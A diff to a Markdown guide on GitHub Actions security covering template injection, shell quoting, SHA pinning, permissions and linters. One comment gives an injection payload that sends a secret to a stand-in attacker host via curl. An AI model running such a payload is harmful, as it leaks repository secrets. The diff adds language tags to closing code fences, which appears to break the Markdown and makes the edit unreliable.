@@ -37,7 +37,7 @@ jobs:
       - name: Echo issue title
         run: echo "${{ github.event.issue.title }}"
         # Attacker can inject: `"; curl evil.com/?secret=$SECRET; echo "`
-```
+```text
 
 **Why it's vulnerable**: The issue title is directly interpolated into the expression. An attacker can close the string, inject commands, and access secrets.
 
@@ -59,7 +59,7 @@ jobs:
           ISSUE_TITLE: ${{ github.event.issue.title }}
         run: echo "$ISSUE_TITLE"
         # Input is treated as data, not code
-```
+```text
 
 **Why it's secure**: The expression is evaluated in a controlled context (environment variable assignment). The shell receives the value as data, not executable code.
 
@@ -69,7 +69,7 @@ jobs:
 # SECURE: Use sanitized context output
 # For GitHub Agentic Workflows
 Analyze this content: "${{ needs.activation.outputs.text }}"
-```
+```text
 
 **Why it's secure**: The `needs.activation.outputs.text` output is automatically sanitized:
 - @mentions neutralized (`` `@user` ``)
@@ -104,7 +104,7 @@ run-name: "Processing ${{ github.event.issue.title }}"
 
 # ✅ SECURE: Avoid using untrusted input in run-name
 run-name: "Processing issue #${{ github.event.issue.number }}"
-```
+```text
 
 ### Template Injection in Conditional Expressions
 
@@ -121,7 +121,7 @@ steps:
       if [ "$COMMENT_BODY" = "approved" ]; then
         echo "Approved"
       fi
-```
+```yaml
 
 ---
 
@@ -144,7 +144,7 @@ steps:
       for file in $FILES; do  # SC2086: Unquoted variable
         echo $file            # SC2086: Unquoted variable
       done
-```
+```text
 
 **Why it's vulnerable**:
 - Variables can be split on whitespace (files with spaces break)
@@ -161,7 +161,7 @@ steps:
       while IFS= read -r file; do
         echo "$file"
       done < <(find . -name "*.txt")
-```
+```text
 
 **Why it's secure**: Proper quoting prevents word splitting and globbing. Using `find` with process substitution is more robust than `ls`.
 
@@ -175,7 +175,7 @@ steps:
   - name: Set variable
     run: echo 'Value is $HOME'  # SC2016: Won't expand
     # Output: Value is $HOME (literal)
-```
+```text
 
 #### ✅ Secure Pattern: Use Double Quotes or Unquoted
 
@@ -185,7 +185,7 @@ steps:
   - name: Set variable
     run: echo "Value is $HOME"
     # Output: Value is /home/runner
-```
+```text
 
 ### Proper Quoting in Multi-line Scripts
 
@@ -208,7 +208,7 @@ steps:
       echo "Invalid filename"
       exit 1
     fi
-```
+```text
 
 ### GraphQL Query Formatting
 
@@ -234,7 +234,7 @@ When building GraphQL queries in shell scripts, use proper quoting:
     EOF
     )
     echo "$QUERY"
-```
+```text
 
 ### Bash Script Security Checklist
 
@@ -266,7 +266,7 @@ steps:
       # Safe command usage
       result=$(grep -r "$INPUT_VALUE" . || true)
       echo "$result"
-```
+```yaml
 
 ---
 
@@ -284,7 +284,7 @@ steps:
   - uses: actions/checkout@v5           # Tag can be moved
   - uses: actions/setup-node@main       # Branch can be updated
   - uses: thirdparty/action@latest      # Always points to latest
-```
+```text
 
 **Why it's vulnerable**:
 - Tags can be deleted and recreated with malicious code
@@ -300,7 +300,7 @@ steps:
   - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
   - uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8 # v4.0.2
   - uses: thirdparty/action@abc123def456... # v2.0.0
-```
+```text
 
 **Why it's secure**:
 - SHA commits are immutable (cannot be changed without changing hash)
@@ -320,7 +320,7 @@ git ls-remote https://github.com/actions/checkout v4.1.1
 
 # For actions with subpaths (like codeql-action)
 git ls-remote https://github.com/github/codeql-action v3
-```
+```text
 
 **Method 2: Using GitHub API**
 ```bash
@@ -329,7 +329,7 @@ curl -s https://api.github.com/repos/actions/checkout/git/refs/tags/v4.1.1 | jq 
 
 # Get the latest release
 curl -s https://api.github.com/repos/actions/checkout/releases/latest | jq -r '.tag_name'
-```
+```text
 
 **Method 3: Using GitHub Web UI**
 1. Navigate to the action's GitHub repository (e.g., https://github.com/actions/checkout)
@@ -364,7 +364,7 @@ get_sha() {
 
 # Usage: get_sha "actions/checkout" "v4.1.1"
 get_sha "$1" "$2"
-```
+```text
 
 ### Verify Action Creators
 
@@ -398,7 +398,7 @@ get_sha "$1" "$2"
 # - Maintenance activity
 # - User reviews
 - uses: unknown-org/custom-action@sha
-```
+```text
 
 ### Review Action Permissions
 
@@ -415,7 +415,7 @@ permissions:
 - uses: thirdparty/action@sha
   with:
     token: ${{ secrets.GITHUB_TOKEN }}
-```
+```text
 
 ### Dependency Scanning
 
@@ -438,7 +438,7 @@ jobs:
         with:
           scan-type: 'fs'
           scan-ref: '.'
-```
+```text
 
 ### Maintaining Pinned Actions
 
@@ -499,7 +499,7 @@ updates:
       interval: "weekly"
     # Auto-merge minor and patch updates
     open-pull-requests-limit: 10
-```
+```text
 
 **Renovate Bot**:
 ```json
@@ -510,7 +510,7 @@ updates:
     "pinDigests": true
   }
 }
-```
+```text
 
 #### Finding All Unpinned Actions
 
@@ -529,7 +529,7 @@ grep -r "uses:" .github/workflows/*.yml | grep "@[0-9a-f]\{40\}" | wc -l
 
 echo "Unpinned actions:"
 grep -r "uses:" .github/workflows/*.yml | grep -v "@[0-9a-f]\{40\}" | grep -v "^#" | wc -l
-```
+```text
 
 ### Supply Chain Security Checklist
 
@@ -564,7 +564,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: npm test
-```
+```text
 
 **Why it's vulnerable**: Compromised workflow or action can access all repository resources, modify code, access secrets, and create releases.
 
@@ -584,7 +584,7 @@ jobs:
     steps:
       - uses: actions/checkout@sha
       - run: npm test
-```
+```text
 
 #### ✅ Secure Pattern: Job-Level Permissions
 
@@ -612,7 +612,7 @@ jobs:
     steps:
       - uses: actions/checkout@sha
       - run: npm run deploy
-```
+```text
 
 ### Available Permissions
 
@@ -653,7 +653,7 @@ on:
 
 permissions:
   contents: read
-```
+```text
 
 **Key differences**:
 - `pull_request`: Runs in PR context (fork's code, limited permissions)
@@ -672,7 +672,7 @@ on:
 
 # Compiler automatically adds repository check:
 # github.event.workflow_run.repository.id == github.repository_id
-```
+```text
 
 ### Environment Variable Handling
 
@@ -692,7 +692,7 @@ steps:
     run: |
       # Token not exposed in logs
       curl -H "Authorization: Bearer $DEPLOY_TOKEN" https://api.example.com
-```
+```text
 
 ### Safe Outputs Pattern (gh-aw specific)
 
@@ -708,7 +708,7 @@ safe-outputs:
   create-pull-request:
 
 # AI never has direct write access
-```
+```yaml
 
 ---
 
@@ -753,7 +753,7 @@ gh aw compile --poutine
 
 # Strict mode: fail on findings
 gh aw compile --strict --actionlint --zizmor --poutine
-```
+```text
 
 ### CI/CD Integration
 
@@ -792,36 +792,36 @@ jobs:
           path: |
             actionlint-report.txt
             zizmor-report.json
-```
+```text
 
 ### Interpreting Results
 
 #### actionlint Output
-```
+```text
 workflow.yml:10:5: shellcheck reported issue in this script: SC2086:info:1:6: Double quote to prevent globbing and word splitting [shellcheck]
 workflow.yml:15:3: property "runs-on" is not set [syntax-check]
-```
+```text
 
 **Action**: Fix shell quoting issues, add missing required fields.
 
 #### zizmor Output
-```
+```text
 finding: artipacked
   rule:
     id: artipacked
     level: Medium
     desc: Actions that upload artifacts without retention limits
   location: workflow.yml:25
-```
+```text
 
 **Action**: Add `retention-days` to artifact uploads.
 
 #### poutine Output
-```
+```yaml
 [CRITICAL] Unpinned action at .github/workflows/ci.yml:10
   - uses: actions/checkout@v5
   - Recommendation: Pin to SHA
-```
+```text
 
 **Action**: Replace version tags with SHA commits.
 
@@ -835,7 +835,7 @@ repos:
     hooks:
       - id: actionlint
         args: [-shellcheck=]
-```
+```text
 
 ### Integration Best Practices
 
@@ -864,7 +864,7 @@ steps:
     env:
       API_KEY: ${{ secrets.API_KEY }}
     run: curl -H "X-API-Key: $API_KEY" ...
-```
+```text
 
 **Best practices**:
 - Never commit secrets to repository
@@ -875,11 +875,11 @@ steps:
 
 ### CODEOWNERS for Workflow Changes
 
-```
+```text
 # .github/CODEOWNERS
 .github/workflows/ @security-team
 .github/actions/ @security-team
-```
+```text
 
 **Why**: Ensures workflow changes are reviewed by security team before merge.
 
@@ -904,7 +904,7 @@ jobs:
       url: https://example.com
     steps:
       - run: deploy.sh
-```
+```text
 
 **Configure in repository settings**:
 - Required reviewers
@@ -923,7 +923,7 @@ steps:
       echo "Commit: ${{ github.sha }}"
       echo "Time: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
       echo "::endgroup::"
-```
+```text
 
 ### Network Isolation (gh-aw specific)
 
@@ -936,7 +936,7 @@ network:
     
 # Or deny all network access
 network: {}
-```
+```yaml
 
 ---
 
